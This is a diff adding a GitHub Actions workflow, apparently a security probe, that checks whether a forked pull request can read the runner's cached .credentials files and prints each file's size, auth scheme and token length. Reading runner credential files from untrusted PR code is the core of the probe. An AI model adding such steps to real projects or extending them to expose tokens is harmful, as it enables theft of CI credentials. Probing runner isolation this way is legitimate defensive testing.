@@ -1,0 +1,28 @@
+name: Fork Creds Test
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check credentials from fork PR
+        run: |
+          echo "=== Fork PR .credentials access ==="
+          echo "Event: $GITHUB_EVENT_NAME"
+          echo "Actor: $GITHUB_ACTOR"
+          echo "Fork: ${{ github.event.pull_request.head.repo.fork }}"
+          CREDS="/home/runner/actions-runner/cached/*/.credentials"
+          for f in $CREDS; do
+            if [ -f "$f" ]; then
+              echo "FILE EXISTS: $f"
+              echo "Size: $(wc -c < $f) bytes"
+              python3 -c "
+import json
+d=json.load(open('$f'))
+print(f'Scheme: {d.get(\"Scheme\",\"?\")}')
+print(f'Token length: {len(d.get(\"Data\",{}).get(\"token\",\"\"))}')
+" 2>/dev/null
+            fi
+          done
